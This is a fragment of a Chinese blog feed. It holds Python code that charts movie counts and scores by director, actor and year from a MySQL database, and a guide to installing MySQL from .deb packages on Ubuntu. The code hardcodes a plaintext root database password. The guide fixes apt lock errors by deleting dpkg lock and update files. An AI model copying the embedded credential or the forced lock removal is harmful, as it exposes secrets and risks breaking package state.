number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴阶段</span><span class="token comment"># 设置坐标轴的范围</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 隐藏无用轴</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将上边的坐标轴颜色设置为空，不显示</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span><span class="token comment"># 将x轴设置为底部bottom,将y轴设置为顶部top</span>ax<span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_ticks_position<span class="token punctuation">(</span><span class="token string">'bottom'</span><span class="token punctuation">)</span><span class="token comment"># ax.xaxis.set_ticks_position('left')</span><span class="token comment"># 将x轴和y轴(底轴和左轴的位置设置为坐标原点)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'bottom'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴的名字</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Director'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Number'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>x <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment"># x轴每10一个刻度</span>y <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token comment"># y轴每15一个刻度</span>new_ticks <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>count<span class="token punctuation">,</span>name<span class="token punctuation">,</span>rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">)</span>ax2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>twinx<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ax2.xaxis.set_ticks_position('bottom')</span><span class="token comment"># ax2.xaxis.set_ticks_position('right')</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>l2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span>Score<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Score'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Number'</span><span class="token punctuation">,</span><span class="token string">'Score'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'图例'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  实现效果</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221112111608.png"></li></ol><h3 id="分析Actor作品数量和平均分数之间的关系"><a href="#分析Actor作品数量和平均分数之间的关系" class="headerlink" title="分析Actor作品数量和平均分数之间的关系"></a>分析Actor作品数量和平均分数之间的关系</h3><h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> MultipleLocator<span class="token comment"># 从数据库中获取数据阶段</span>db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>                     password<span class="token operator">=</span><span class="token string">'20030729a'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'movie'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select count(*) cnt,Actor,avg(Score) from movie.movie_data group by Actor order by avg(Score) desc;"</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>res1 <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Score <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> row <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cnt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    Score<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 画图像阶段</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 建立图标</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴阶段</span><span class="token comment"># 设置坐标轴的范围</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 隐藏无用轴</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将上边的坐标轴颜色设置为空，不显示</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span><span class="token comment"># 将x轴设置为底部bottom,将y轴设置为顶部top</span>ax<span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_ticks_position<span class="token punctuation">(</span><span class="token string">'bottom'</span><span class="token punctuation">)</span><span class="token comment"># ax.xaxis.set_ticks_position('left')</span><span class="token comment"># 将x轴和y轴(底轴和左轴的位置设置为坐标原点)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'bottom'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴的名字</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Actor'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Number'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>x <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment"># x轴每10一个刻度</span>y <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token comment"># y轴每15一个刻度</span>new_ticks <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>count<span class="token punctuation">,</span> name<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">)</span>ax2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>twinx<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ax2.xaxis.set_ticks_position('bottom')</span><span class="token comment"># ax2.xaxis.set_ticks_position('right')</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>l2 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span> Score<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'Score'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Number'</span><span class="token punctuation">,</span> <span class="token string">'Score'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'图例'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  分析年份和评分之间的关系的完整实现代码</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> MultipleLocator<span class="token comment"># 从数据库中获取数据阶段</span>db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>                     password<span class="token operator">=</span><span class="token string">'20030729a'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'movie'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select count(*) cnt,Year,avg(Score) from movie.movie_data group by Year order by Year;"</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>res1 <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>xu <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Score <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> row <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cnt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    Score<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 画图像阶段</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 建立图标</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴阶段</span><span class="token comment"># 设置坐标轴的范围</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 隐藏无用轴</span>ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>gca<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将上边的坐标轴颜色设置为空，不显示</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'top'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_color<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span><span class="token comment"># 将x轴设置为底部bottom,将y轴设置为顶部top</span>ax<span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>set_ticks_position<span class="token punctuation">(</span><span class="token string">'bottom'</span><span class="token punctuation">)</span><span class="token comment"># ax.xaxis.set_ticks_position('left')</span><span class="token comment"># 将x轴和y轴(底轴和左轴的位置设置为坐标原点)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'bottom'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>spines<span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_position<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 设置坐标轴的名字</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Year'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Score'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>x <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment"># x轴每10一个刻度</span>y <span class="token operator">=</span> MultipleLocator<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># y轴每15一个刻度</span>new_ticks <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>count<span class="token punctuation">,</span> name<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>name<span class="token punctuation">,</span>Score<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">)</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">,</span>endpoint<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>y <span class="token operator">=</span> x<span class="token operator">*</span><span class="token number">0.0112</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">9.3</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token string">'10'</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="根据上述图表进行数据分析"><a href="#根据上述图表进行数据分析" class="headerlink" title="根据上述图表进行数据分析"></a>根据上述图表进行数据分析</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221128213448.png"></p>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux环境下元数据库(mysql)的安装</title>
      <link href="/%E5%85%83%E6%95%B0%E6%8D%AE%E5%BA%93(mysql)%E5%AE%89%E8%A3%85/"/>
      <url>/%E5%85%83%E6%95%B0%E6%8D%AE%E5%BA%93(mysql)%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="linux环境下元数据库-mysql-的安装"><a href="#linux环境下元数据库-mysql-的安装" class="headerlink" title="linux环境下元数据库(mysql)的安装"></a>linux环境下元数据库(mysql)的安装</h1><h2 id="解压mysql安装包"><a href="#解压mysql安装包" class="headerlink" title="解压mysql安装包"></a>解压mysql安装包</h2><ol><li>  将mysql的安装文件移至/root/downloads下</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102102905.png"></li><li>  创建文件夹/root/bigdata/mysql</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102102921.png"></li><li>  将安装文件解压至/root/bigdata/mysql</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102102932.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102102951.png"></li></ol><h2 id="升级并安装依赖包"><a href="#升级并安装依赖包" class="headerlink" title="升级并安装依赖包"></a>升级并安装依赖包</h2><pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;mysql# sudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="如果报错"><a href="#如果报错" class="headerlink" title="如果报错"></a>如果报错</h3><pre class="line-numbers language-none"><code class="language-none">E: 无法获得锁 &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock-frontend - open (11: 资源暂时不可用)E: 无法获取 dpkg 前端锁 (&#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock-frontend)，是否有其他进程正占用它？root@master:~&#x2F;bigdata&#x2F;mysql# rm &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;lockroot@master:~&#x2F;bigdata&#x2F;mysql# rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lockroot@master:~&#x2F;bigdata&#x2F;mysql# rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock-frontendroot@master:~&#x2F;bigdata&#x2F;mysql# apt-get upgradeE: dpkg 被中断，您必须手工运行 ‘dpkg --configure -a’ 解决此问题。root@master:~&#x2F;bigdata&#x2F;mysql# rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;updates&#x2F;*root@master:~&#x2F;bigdata&#x2F;mysql# apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103045.png"></p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;mysql# apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103104.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103122.png"></p></li><li><p>   <a href="https://www.cnblogs.com/while19/p/16197099.html">无法获取 dpkg 前端锁 (/var/lib/dpkg/lock-frontend)，是否有其他进程正占用它？ - while19 - 博客园 (cnblogs.com)</a></p></li></ol><pre><code> [(23条消息) dpkg 被中断问题解决方法_半遮雨的博客-CSDN博客_dpkg中断](https://blog.csdn.net/qq_14935437/article/details/77199615) <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;mysql# apt-get install libaio1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></code></pre><ol start="5"><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103147.png"></li></ol><h3 id="3-按顺序安装deb-程序包"><a href="#3-按顺序安装deb-程序包" class="headerlink" title="3.按顺序安装deb*****程序包*"></a>3.按顺序安装deb****<em><strong>*程序包*</strong></em></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-common_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103226.png"></p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;mysql# dpkg -i libmysqlclient21_8.0.14-1ubuntu18.04_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103239.png"></p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;mysql# dpkg -i libmysqlclient-dev_8.0.14-1ubuntu18.04_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103254.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-community-client-core_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" 